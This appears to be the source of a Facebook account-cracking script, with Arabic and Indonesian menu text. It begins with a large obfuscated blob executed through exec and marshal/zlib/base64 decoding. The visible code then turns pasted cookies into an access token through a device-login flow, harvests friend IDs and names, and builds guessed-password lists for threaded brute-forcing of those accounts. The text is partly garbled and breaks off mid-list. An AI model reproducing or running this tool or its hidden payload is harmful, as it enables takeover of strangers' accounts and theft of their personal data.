90½Í©\x9aÎÆÊ¨\x88®±\x8f³\x8eÊ²\x92«\x9cÌ\x9a¦Ì¨Æ»®É¾½\x95Ì\x9aÐÏÌÏµ²\x89\x9a\x86Ì\x9a\x96·Ì\xad\x9b±\x89ª\x8a\x8c¨®\x9aÉ³\x88¬»ª²¦²Í\x93Ë¸Æ¥°\x90\x96»\x87\x8dÇÐ\x89®¾\x86Ê½±»¯¹\x92¯®¬¹¸±È©\x93©\x9b\x8c³\x8f\x92§\x9cÎ¬\x9b\x9bµ¾Í\x89\x8e³¥\x85ÐËÊ°¯\x89²¸\x97²¦ÈÐ\x9cÐ¨³\x97¥\x86Ï\x91\x85\x8c\x86\x99ÌÈ\x89\x89\x8b\x9bË«\x9dÉ\x95\x8e³Ì\x9c\x99©ª±\x95\x85§Ì³\x9aµÈ\x98Ì¬Ð\x9aÈ\x8a¶\x8c¯Êº\x91\x9cÌ\x94\x8aÌ\x8a\xad°Ë\x96©\x86\x9bÌ¶ÉÐ¹«»\x8b\x8dÏ¦\x87\x8f©§Ç¶\x87©Ì°\x97\x86\x91\x90·\x9d\x89\x97¸\x92Î±\x8e\x9c³¦¾º±\x86\x9b«\x8a¸\x88¼«Ô¥\x86¦È\x96·\x91¾ÇªÌÉ¬\x9e\x8a\x9a\x95\x97©°ËÎ\x92\x89\x90\x92©°©¯ÌÊ\x9d«\x98\x89\xad°\x85\x94µÔ¼\x97Ê\x98¹¯\x99\x8a¯\x8f©Æ\x9d·¼\x92Ô\x86µ³ÌÎ\x9d±\xad\x88\x88¾³«Ê\x95Ô¯«\x94Ë\x9dÏ®È\x92Ç»\x8b¥\x89\x8f\x97ÆÈº\x91Ç¹\x98\x90Æ´±\x89¸³\x9c»\x8c´º¥±Ë°Ë³¶¼\x88Æ½\x9c\x9a\x9d»©\x90Ì\x96\x94\x86\x8d°«§\x91\x90Ç©\x87\x91½\x9cÏ\x9b\x92©\x9b³¨«\x8e¨¼\x87\x87\x9d\x8dÌ\x9c\x8d\x8d\x8b§¼¥\x86´²¶\x9cª\x90\x89Ê\x8cªÏÈ\x8bª\x94§\x97º\x9eÌ\x9cÐ½®\xad\x96\x9aË\x94¦\x87Ê²\x8b\x86\x9c\x9d¦Í\x99©\x9eµ\x96©\x94\x8dÔ¯\x8c\x9bÐ¬¾Ì\x8e\x8a¨Í\x96¹\x9aµ¯Ðº\x87¬Ô½\x8b·±\x97³©Ì½«\x93\x8f²Ç®\x89\x8e«\x90·¶\x99»Ð·»Ì´·\x8d\x8a²\x90\x85\x8a¬\x86¯\x98\x9a\x93®\x89\x97\x96ªÊÊ\x9e¦\x86Ê\x8b\x8e\x86\xad\x9d\x88\x8f\x8aÈ³¾\x9b\x91\x8c\x98¯\x93¾¯\x8f»\x8dª¼\x93\x89Î\x90\x95\x9c\x9a\x97Ï±\x99¶¥·È§¾°\x86¯\x92\x9a¦Ê\x95Í´\x8d\x92©\x8e\x95\x86¨¬Ì\x93\x99¸Ì¹\x8b»\x94Ì\x97·\x96\x85¯ÏÇÏ\x8c\x9aÌ\x97·¼¾Ð¯Ç¦\x9b¥´²±\x99¥É¹²¯Ç®½\x86¹±\x93É³\xad¥°\x94ÆÇÏ\x88Ð\x94\x96¨ÇÊ\x8bÊ±\x91º¸º§²©\x94\x8d²\x93¦ª³¹\x97\x86½Ê¸\x8b\x89\x87\x9c\x9e\xad¶ªÈÏµ\x9c\x87\x96¯¬\x91\x9a¥©Æ»\x86µ\x8c¥¬\x96Ì¦Ç\x85\x93\x8f\x8e\x88Ôª§\x93Ê\x92±µ¨ÌÎÉ¥¸\x88Î\x8dÔ\x8d«¸\x88±¹¼¹©\x91Æ\x87·\x8eº\x8c\x90\xadÈ²µ\x8fÈ¦´¹©\x93\x8f\x8c²Ê\x86Í\x86\x9a\x94\x9b©\x9d\x91\x8b³\x8a\x9e\x92\x86§´Ç\x9c\x88\x85Ìº¾Ê\x8c¯\x9e\x9c\x99\x85Ï\x97¨Ç¬\x98\x9a¨¹\x95\x8a¬\x8cÍªÇË\x8a\x8b\x85¦\x85¼\x97º¶\x88\x95Ç\x93\x98\x9a\x91\x8a\x8cË·\x85§É¼Î\x87Í\x97²\x89É·»¨\xadª\x8d\x9d\x8a\x97\x9c¦©·»\x8f\x92\x8a´Ï±«\x91\x92\x8a\x91\x99µ\x9c\x89É\x87½¥´ÏÐÎ\x91¾¼\x93Æ¶\x8b®°º¼\x89\x85\x86Ì\x90\x98¨Ç\x9b\x87\x85µª\x88\x9cÔº²³\x8b«Ë¨¥\x9dÏ©\x8a¬¬Ë\x92\x88È\x91»½®\x9cÌ\x91ËÌ¬\x8d\x9b\x86¾Æ§\x97\x8a\x9d\x8e¸\x86©\x89Æ\x88\x88\x9e\x95·\x95\x98Î\x95²\x85¶ª\x9a\x8c»±Ô\x94\x8c\x98¼¯·º\x9e\x8c\x92\x85\x91¾³ºÏ\x96\x8bÊ\x85\x9a±\x85¾Í©±\x95\x87\x9d\x94Ôµ®¶\x98¥È¸Ë\x88·°\x8f¬\x9b\x86\x89«\x91\x9cÌ\x95Ê\x9aº®É®¥¥\x86\x9b\x85§±§¥¹Î¯\x88Í¦\x8b±²\x85\x8c¼Ì±Ê\x89´\x87©\x9bÏ\x92\x99\x85\x8f§\x87\x8a¹\x90\x8bÎ\x8d\x97\x8c\x9a\x9b\x9eª¶ªÇ°\x9d¬\x94Ç±\x93È\x94\x93\x8c¨\x86\x94\x91\x9b¥\x8c\x9eÌÈµÌ´\x9dÏ¯\x9b¶\x86ÊÏ\x85Æ°°®Æ·\x99°\x8c±¦\x8eÉÌ¹\x85È\x97\x88\x99Ç\x8b\x96¨ºÈ\x87ÎÇ±\x91\x98\x9cº\x87\x94Î\x98\x8f¬\x91\x8dª¥¨\x8b¨\x99´\x9c\x95\x8e¼¸©Ê¾\x93°\x88«Ô¹\x8c¯¥\x90\x8d¨Ê¹Î«¶\x96°\x8a\x86\x85·Ô\x95\x98É\x8bÔ\x93\x99¦·\x9a\x86Ç¯\x94\x85\x9b¼\x9c\x9c¶»\x97\xad·\x9a\x9d´½Ì\x91ªË¯\x96¸Ì\x98\x91µ´È\x88\x9bÔº»Ëµ´Æ\x95¼\x90ÐÆÏ¨\x88»ÏÈ½Î²\x87\x9b°\x9eÇÌº\x89\x98µ¯\x9b\x8cÌ¥»\x88¥É\x9a\x96²\x94Ç°\x98\x8eÇ\x92\x89¯Î\x9c\x86¦¥\x89¨°¸§²\x94\x9d\x87\x96Ð¶È½\x92«±¯ÐÌ½\x93«\x99Ê§\x8d¹¥\x90\x87\x85\x9d¦§\x92\x95º\xad\x93\x94\x98»®\x85µ\x86\x86È½²\x9d¨\x93\x90¨¸\x97ª\x99Í\x9d\xad\x99¾Ë¯Æ°\x9e\x95©¥\x92\x8b\x8b\x96\x90\x97±\x99¬\x98\x92¸°\x93¯ÆÇ\x9cÔ\x85®\x89\x8b\x90¾È\x96¨Ç¶\x8d¾\x91\x94µ¥Ê\x9dÇ½¥Ð¶\x99\x9a´\x85È\x8a\x97ÉÇ\x86\x9aÇ½µÌÇÏ\x97\x8a\x8bÔ\x91\x94½¦Æ\x88¹¦Í\x95§\x8c©Æ\x87®\x91Î\x9c½\x9eÔÏ¸Ï»¸\x91\x8d¨·\x9eÏÎ\x9e©\x90\x9d\x96´Æ\x98µ¶\x9e\x92\x92\x90\x97\x9e\x9dÐÐÊ¨Ì\xad\x9d\x8b\x86\x8cËÎ©\x8cÈ\x96\x94\x90\x9a\x8f\x9aºÇ\x90Ê¶\x91©\x93\x85È\x9c§Ðª\x9b\x85\x88¸°\x8b½»\x9b¦ª·Ô·É\x8a\x91\x8aÇ½©É··±È¥Ô¦®Ï·\x93\x88Ê\x88ÉÍ\x91°\x8c\x85\x85¬\x97ÉÇ\x9c\x90\x9a\x9aË¸ÇÆ\x85É\x98\x8bÇ\x88¸ªÆ\x9eÆ©\x86\x8a\x88°°Ðº¹§\x9a±\x96©»Ì¾\x9c¸Í°Ð«\x94ÔÉ®\x95\x9bÔ\x86¦ÔÊ\x8d\x91Ë\x90¦¥Ç\x89\x9c»È»\x9a\x8c³®\x87Í\x93²ÉË\x9dÍ¬\x94\x8f§°\x94¥\x9eÎ\x9aÐ\x8e\x8d\x91»¬\x88Î®\x9eÎ\xadÇ\x93ÉÉ\x86\x8fÎÉ¥ª\x85\x8eª\x93±\x8e\x93Î\x86Ëµ«\x9eÏ¸\x9dÐ¶\x98µÍ\x87\x97¦¬\x96\x95\x88Í®¬°Ê\x8b\x8e\x85·´\x9b\x8a³\x86\x8cÎ\x8e\x91¼\x8fÐ¯¸\x85\x87\x8f\x8d\x95\x8f²\x87\x93Ê\x9c\x8c³¥ËÏ\x90\x91±¨·\x88«ÊÇ·©ËË\x9eÌ«\x9a\x8d´\x8d¼\x9d\x95\x97ÉÍ¼¼\x91\x88ª\x90\x9a\x98©¸\x9c´\x8aª±\x8d\x8d\x85¨\x98\x96°\x89\x90\x9e½©\x8a\x89Ç¹\x8d\x9e\x9a¯¥\x9b\x9b®\x90Ð¨®ÈÎ\x8f\x8e\x8b¹\x85±ÌÉ¨\x8e\x8d\x8c¸É±\x9d¨²\x8a¾\x9eÌ\x86\x91±\x8e«ºÍ\xadµ\x9a\x91É«\x9b±\x92\x85È\x86\x91´\x9e\x95Í\x89\x89\x97Í\x99ÐË¸Î®\x99\x8a\x9e¶²Ì\x9e\x9b¥È\x8bµË°\x9a¹\x91\x9cÏÆÉ\x85\xad\x85§\x99\x8f\x8fÈ\x89Í\x9bÐ\x85\x8a±\x8dÆ·\x99¯\x93²\xad°ÌÆ\x9b\x8bÇ\x9dÔ\x99\x8a\x89·Ô»\x89\x9d\x8b\x99É¯Ð\x99¦¯\x9d¹·Ð\x8e¦\x9a\x99©\x91°\x9b\x86¨\x99§\x99\x9d\x9aÍ³¯©\xad\x90°\x89¨ÆË\x8b\x8c\x9d\x95\x97\x8e\x9cÍ\x8d°\x8b\x88©\x8fªº\x9b³\x90Æ\xad\xad¯µ½¯·ªµ\x92¦¬ÈÈ¥º¯¸¦\x90Ç¦®Ô©\x90³«É·\x90Ë\x8f\x8c¨\x9d\x95¶¾¨«\x93¶Ç\x8cÉÉ¼¨±º\x8f´ª\x8d\x8fÏ¨\x96\x94\x9b\x98\x9d\x87É\x8f¸É½\x8c±\x99¸ÏÈ®\x8aÍ\x9d\x96¾\xad²¬½±·\x94µ¯\x88\x9a¾ÐÆ±¯ª±\x8f\x90\x8e®º\x97§§\x92\x9d\x85±Ï\x9a¯½¸¯¶\x85ª\x99\xad\x92\x8eÍ\x99¾Ì\x97ÐªºÎª\x94¥ªÉ\x8f³É«\x8e±µ¬\x9b\x89«¬©«°\x94Ì\x90\x99\x8b»\x86µ\x91¨\x8eÉª©\x90\x8c\x9dËÊªÏÏ\x85Ð¸\xad»»É¾©\x90°»\x87³\x89·©Ï¨¬Ë\x94®\x87¸\x95\x9e\x9d²«\x85\x95\x88\x91Ô®\x85\x89²½\x86\x9dÐ¾··\x99\x97¯¾½\x90\x9a\x87\x97¸Ð\x95\x8dÐÇÏ°¸®°¼\x94ÍÍÏ¹Ìµ\x89§½¥\x89ÍÏ\x8c\x9bªÇ»½±\x90\x95\x90\x9e«\x9c±\x95¸¯¸Æ\x8a·\x9c\x92\xad\x93\x87\x8f\x86\x97¬ºÐ¦²\x97\x8d»§\x92¥¶¨Ç\x94¬\x94§ª\x94´\x8c²\x9a¥º\x97\x9d\x85»\x94Î¦¥\x9c\x9d\x9c\x95º\x94µ\x99\x90\x8cÎ»Ð\x99\x8a´\x8b¨º\x8cÎË\x8eÆ¦\x8f\x93²\x9e¶Ïª©¸Í\x94Ï¸\x8bÆ½\x99½ª©Ï\xad®³\x9bº©©¬\x92Æ\x92¶¦±\x91Ì\x94\x87\x8d®Ï²\x94¬§©Ë¥Í\x88ª\xad¨\x92¬Ï®\x94Ç¸¦³·Í¾Ï¯\x9cÆÈ\x88\xad¨³±\x8e\x9e«\x97«È®\x94\x94\x8d«µ¼´Ë¯²Ï±³\x9b»Í\x8a¸\x85É´¹\x86Ð\x9b¸®¸¹\x9a¹Ï\x95«\xad¶\x89·½§§¹Í¹Ê\xad\x97\x92\x9a\xad¹¶\x91\x95º\x8e®®¥¹¦¶\x97\x92°\x87\x8c²\x9e\x88\x86©\x90\x91\xadÐ§Ë¬¨\x8aª¥\x85º§Æ¯¾È\x87¨¸\x8d¦Ê\x8d\x8e¬\x97\x9bºÏÇ\x8a\x95\x9e\x9b\x96¸\x93\x9e¸½Ë\x8c²\x8a\x9c\x92®·\x85\x9d\x94¨\x94°°º¦©²²Ô¬¹\x9a¹³¶Ç²\x9d¼«\x9b«\x88µ\x9a°±\x8d±·´\x96\x8c§º¨ÈÎËÆ««»ªÏÔ«\xad\x8f¹¥\x9d\x9b«\x88³´\x8f\x9c®Ì\x88\x8f©\x8a©ÏÊ\x92ªÆ\x97´\x9c\x8aÌ\x93\x96\x8d\x8fÊ´\x94\x8eµ\x90\x92º\x8f¹Ë\x95¯ª\x9b\x92\x96½Ô\x98´Í\x8aÍ\x99¼\x87·\x93\x8b¯\x96\x9dµ«²Ô¬\x88ª®\x85Æ¹\x86¨¸§¸\x99¶\x92\x91Ë\x85\x9a\x8d«©\x94°\x8c±\x8a\x9c¸®¶Ç\x87\x90\x8a»¹\x93Ô²¯±\x85«¬\x92¸ª\x90Ë\x9d¯\x95\x8d¸\x8a´\xad°\x93¦\x98\x86\x96\x8f\x92\x92\x9b²±½ª¶¬Ï¥\x98·Ï«\x95\x8d\x8f\x94\x8eÇ\x94¬\x97Î\x85\x9c«³²\x92¯º¹ÍÐ¨\x9e\x9e¯\x97\x9dÉ³µ\x97\x8d\x97¸\x96\x8e°\xad½¶Ï\x93¶\x90Ï\x8fª\x8f\x88²±Ï\x9c\x95\x95\x9a¹º\x97½\xad\x97´Ê\x93\x8cº²Ô°²¨\x91\x85\x95\x8a¥\x90´\x8fº\x98\x89\x8a¦\x9b\x8c¥\x9e\x88¶\x9eÇ\x86Ê°¨¸\x89±´®´\x88ÎÊ»¨\x8b§\xad»\x99\x94\x91ª\xad\x8f¦µÉ\x92\x96±³¦\x9e²\x96\x8cÎ\x90ª©±®\x8aµ\x8c\x8d\x9e\x9eª\x9c\x8b\x8d\x93\x97³\x99\x88\x8f©\x88Ç¬É\x8c\x8d\x93\x93·\x93°\x8d©\x8d³\x8a\x8b¦\xad\x87\x97\x91¶Ô\x8f\x8d\x93\x86°\x9a\x8a\x8b²\x89§¨\x90\x8bÊ®\x90¸Æ¦¬\x85Ç³\x93ÏÎ\x93¬¯¥Ï\x90\x8eÔÇ\x95\x91\x8b§Ì«¦\x9b\x94\x97\x96º\x95²Ê±Ë\x88\x90\x92ªÈ®¬¬\x9b®Ë\x8c²´\x9cµ\x8c¥Ë·¦\x85Ï\xad¦\x86¯¥´Ì\x89\x93\x98½\x9bÔª¥·ÐªÆ³·\x8fÌ¼\x8f´Ê¨ÆÎ\x95´\x93¾Ð\x98º¯¦¸\x96º\x94Ç\x98¼¯\xad±È´\x89¶±Ç\x8f\x95Í·ªËÔË\x86©\x98Ìµ¾¼\x9c\x8d\x93\x8c\x8a³\x87\x8c\x87\x85³¸\x85Ð\x94\x9c¸Ë¶ÔÊ«\x91Ð¦\x87\x93Î\x96¸¨Ç½\x92¶\x93Æ\x99\x86´\x99\x9cº\xad\x8f®\x85«Ï\x99Ê¾Ï¨\x85²¹\x9e\x93Ç\x96\x86\x9a\x9a\x94\x8aÇ\x85¸\x89ÐÊË\x90\x86ÊºÔ\x8c\x9b§Æª\x89º¯Ô\x90¯\x95Ç\x89Î\x9cÔÆ\x87\x9e\x87\x8c\x91´µº\x92½\x93\x86Æ\x96·Æ®®¥\x9bº\x8c\x85±\x94\x90\x86\x93²\x91±¦¥º\x90\x93«\x9b»Ô\x85ÈÌ´\x8e©Æ¶¹§\x98ÇÍ\x89Ð¸³\x89¹\x8e\x86\x93§\x96\x8dºÌÐ\x9e\x96®\x98\x88\x8dË²\x9a\x90\x9e\x9d§Î½¯\x8c\x97Ð\x99\x97Ô¸\x8cµËÉÉ\x89²\x9d¹¬ÆÉÏÉÔ¯\x9c\x91ªÆ¼Ç\x9d¼¹Ð³Ê¹ÐÆ\x8b\x98ª½¾»\x98ÍÎ\x9d\x92³²·Æ\x91\x93Ð\x96È²Ç¸É³\xadÍµ¸Ï\x9c±\x8c¥¨«\x8d\x98Ô·»®È½\x94¬±§¸\x9b\x9c\x8c\x8dÎÆ¬\x8c§È´Í\x9a\x94§\x93\x92\x8c\x87¯¯¶Ï\x96\x91\x9d´\x93\x91²ÌÌÊ\x8fµ¦\x87°Ë°º\x98Ì\x97´³¼Ï\x85\x89»½Ï\x8f\x9cË\x9eÌ\x8b´\x86·Ô\x97\x93\x85\x8c±\x88\x8fÏ\x8d«\x90±\x86\x88¹¯½µ\x90±Ê\x9d¼\x90®\x8d\x98\x8f§\x97\x9e\x89¼©\x9a¸\x8e\x9c¹¨Ë´\x93\x88©\x8d\x98\x8f§\x97\x9e\x89¼©\x9a¸\x8e\x9c¹¨Ë´\x93\x88©\x8d\x98\x8f§\x97\x9e\x89¼©\x9a¸\x8e\x9c¹¨Ë´\x93\x88©\x8d\x98\x8f§\x97\x9e\x89¼©\x9a¸\x8e\x9c¹¨Ë´\x93\x88©\x8d\x98\x8f§\x97\x9e\x89¼©\x9a¸\x8e\x9c¹¨Ë´\x93\x88©\x8d\x98\x8f§\x97\x9e\x89¼©\x9a¸\x8e\x9c¹¨Ë´\x93\x88©\x8d\x98\x8f§\x97\x9e\x89¼©\x9a¸\x8e\x9c¹¨Ë´\x93\x88©\x8d\x98\x8f§\x97\x9e\x89¼©\x9a¸\x8e\x9c¹¨Ë´\x93\x85Æ\x99Ô\x89\x8eË´Ð²®\x99\x85·©\x86º\x87\x9d¯Ç\x8a»\x89\x86¯¦¯\x96Ð»±\x8a\x9bÔ\x95Ç\x8aÌ\x9cµ\x9dÝÝÝ'
decrypted_script_custom = custom_decrypt(code)
exec(decrypted_script_custom)

key = "ggÈljÈÈecÈÉoeÇmim"
exec(marshal.loads(zlib.decompress(base64.b64decode(code.encode()))))


dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def fak_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()

def banner():
	print(f'''\t{asu}''')

def SDM():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			main()
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cok = input(' ڪوڪيز cookies  = ')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); masuk = input('\n[VIP]  tekan enter'); os.system('clear'); login()
	except Exception as e:
		print(e)
#------------------[ سلفادور]----------------#
def main():
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	gh = 'h'
	print('') 
	print(f""" \x1b[1;97m\x1b[37m\033[93m\x1b[0;96m      ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
	║\33[0;41m        [ نـــمـــࢪود  𝗦𝗗𝗠“‌ 🐅  |℡]         \033[0;92m║
	╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
     
─────▄▄▄▄▄███████████████████▄▄▄▄▄──────
────▄██████████▀▀▀▀▀▀▀▀▀▀██████▀████▄────
──▄██▀████████▄─────────────▀▀████─▀██▄──
─▀██▄▄██████████████████▄▄▄─────────▄██▀─
───▀█████████████████████████▄────▄██▀───
─────▀████▀▀▀▀▀▀▀▀▀▀▀▀█████████▄▄██▀─────
───────▀███▄──────────────▀██████▀───────
─────────▀██████▄─────────▄████▀─────────
────────────▀█████▄▄▄▄▄▄▄███▀────────────
──────────────▀████▀▀▀████▀──────────────
────────────────▀███▄███▀────────────────
───────────────────▀█▀───────────────────
╔══════════════════╗
  X+قــناتي  ✓☞ @py_1hon
╚══════════════════╝                    
""") 

   
	print(f" \x1b[38;5;226mالقائمة ") 
	print('\x1b[1;97m\x1b[37m\033[93m\x1b[0;23m━'*30)
	print(' \033[0;1m[ \033[31;1m1 \033[0;1m] 𝐕𝐈𝐏 - صـيد مـن اصدقاء ')
	print('\x1b[1;97m\x1b[37m\033[93m\x1b[0;94m**'*25)
	print(' \033[0;1m[ \033[31;1m2 \033[0;1m] 𝐕𝐈𝐏 - صـيد من ملف  ')
	print('\x1b[1;97m\x1b[37m\033[93m\x1b[0;94m**'*25)
	print(' \033[0;1m[ \033[31;1m0 \033[0;1m] 𝐕𝐈𝐏 - خروج  ')
	print('\x1b[1;97m\x1b[37m\033[93m\x1b[0;23m━'*30)
	
	_____alvino__adijaya_____ = input(f'{u} [VIP]  آخـتاࢪ : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		crack_file()
	elif _____alvino__adijaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(' [✓] - Done Logout + Hapus Kukis ')
		exit()
	else:
		print('>> PILIH YANG BENAR ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()

def crack_file():
            try:
                print('')
                fileX = input (f'{P}Name File {M}:{H} ')
                for line in open(fileX, 'r').readlines():
                    id.append(line.strip())
                setting()
            except IOError:
               exit(f"\n{M}File %s not found"%(fileX))
def setting():
	hu =('3') 
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f'{N}├───[{H}+{N}] حط رقم 1 ')
		exit()

	hc = input(f'│  ╰─➣{h} ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print(f'{N}│')
	passwrd()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		
		#uu = ''
		#sol().print(mark(uu, style='yellow'))
		a = input(f' {u}ID : ')
		
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			
			yu = f'{b} Total ID :  \033[2;32m '+str(len(id))
			print(yu)
			setting()
		except Exception as e:
			print(e)

# DUMP ID MASSAL
def dump_massal():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	#except IOError:
	    #exit()
	try:
		token=open('.token.txt','r').read()
		cok=open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		kumpulkan = int(input(f'اڪتب عدد الايديات تريد تصيد عليهم : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'ايـدي لـ ID  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	           #نمـࢪود- SDM
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        print('  ')
	        exit()
	        #نمـࢪود- SDM
	try:
		print(L + '✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮')
		print(f'''>> ID : {h}''' + str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
	#نمـࢪود- SDM
		print(f'{x}')
		print('>> Sinyal Loh Kurang Bagus ')
		#نمـࢪود- SDM
		back()
		#نمـࢪود- SDM
	except (KeyError,IOError):
	#نمـࢪود- SDM
		print(f'>>{k} Pertemanan Tidak Public {x}')
		#نمـࢪود- SDM
		time.sleep(3)
		#نمـࢪود- SDM
		back()
#نمـࢪود- SDM
#نمـࢪود- SDM
#نمـࢪود- SDM
def setting():
    hu = '1'
    if hu in ('3', '03'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('1', '01'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        exit()
    hc = '1'
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('',):
        setting()
    _jembot_ = '2'
    if _jembot_ in ('',):
        back()
    elif _jembot_ in ('2', '2'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = '1'
    if pwplus in ('2', '2'):
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[green]] يمكنك وضع باسورد واحد فقط\n[[cyan]•[green]] Contoh :[green] 123456qwerty[green] '))
        pwku = input('>>ادخل الباسورد : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
        passwrd()
        
def passwrd():
    clear()
    print(""" \x1b[1;97m\x1b[37m\033[93m\x1b[0;96m  
    
     
╔════════════════════════════╗
███████╗██████╗ ███╗   ███╗      ║   
██╔════╝██╔══██╗████╗ ████║    ║  
███████╗██║  ██║██╔████╔██║     ║   
╚════██║██║  ██║██║╚██╔╝██║     ║      
███████║██████╔╝██║ ╚═╝ ██║     ║      
╚══════╝╚═════╝ ╚═╝     ╚═╝       ║
╚════════════════════════════╝               
╔═════════════╗
  X+المـبࢪمـج ✓☞ @M_T_F
╚═════════════╝                    
""") 
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            SDM = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    SDM.append(nmf)
                    SDM.append(frs + frs)
                    SDM.append(frs + ' ' + frs)
                    SDM.append('١٢٣٤٥٦')
                    SDM.append('١٢٣٤٥٦٧٨٩')
                    SDM.append('1122334455@@')
                    SDM.append('Aa123456')
                    SDM.append('mmmmnnnn')
                    SDM.append('nnnnmmmm')
                    SDM.append('mmnnbbvv')
                    SDM.append('zzzzxxxx')
                    SDM.append('zzxxccvv')
                    SDM.append('qqwweerr')
                    SDM.append('12345@12345')
                    SDM.append('123@123')
                    SDM.append('1234512345')
                    SDM.append('123412345')
                    SDM.append('1234554321')
                    SDM.append('00998877')
                    SDM.append('123456123456')
                    SDM.append('1122334455')
                    SDM.append('1q2w3e4r5t')
                    SDM.append('1q2w3e4r5t6y')
                    SDM.append('1020304050')
                    SDM.append('20222022')
